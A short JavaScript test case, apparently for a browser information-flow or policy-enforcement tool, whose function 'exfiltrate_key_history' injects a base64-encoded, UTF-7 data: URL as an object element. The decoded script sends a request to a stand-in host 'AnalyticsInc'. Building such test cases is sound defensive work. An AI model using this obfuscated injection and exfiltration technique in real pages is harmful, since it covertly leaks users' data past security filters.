function exfiltrate_key_history() {
  var data$$18 = "PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD1kYXRhNCIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=";
  var URL = "data:text/html;charset=utf-7;base64," + data$$18;
  var script = document.createElement("object");
  script.data = URL;
  var v0 = document.getElementsByTagName("body")[0];
  JAM.call(v0.appendChild, v0, [script]);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
